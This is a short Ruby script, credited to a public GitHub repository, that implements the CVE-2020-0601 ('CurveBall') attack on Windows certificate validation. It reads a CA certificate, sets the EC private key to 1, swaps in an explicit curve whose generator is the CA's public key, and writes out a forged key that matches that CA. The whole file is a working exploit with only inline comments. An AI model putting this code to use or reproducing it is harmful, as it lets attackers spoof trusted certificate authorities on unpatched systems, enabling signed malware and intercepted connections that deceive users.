#!/usr/bin/env ruby
# (c) ollypwn https://github.com/ollypwn/CVE-2020-0601/blob/master/main.rb
require 'openssl'

raw = File.read ARGV[0]
ca = OpenSSL::X509::Certificate.new(raw) # Read certificate
ca_key = ca.public_key # Parse public key from CA

ca_key.private_key = 1 # Set a private key, which will match Q = d'G'
group = ca_key.group 
group.set_generator(ca_key.public_key, group.order, group.cofactor)
group.asn1_flag = OpenSSL::PKey::EC::EXPLICIT_CURVE
ca_key.group = group # Set new group with fake generator G' = Q
ca.public_key = ca_key

File.open(ARGV[1], 'w') { |f| f.write ca_key.to_pem }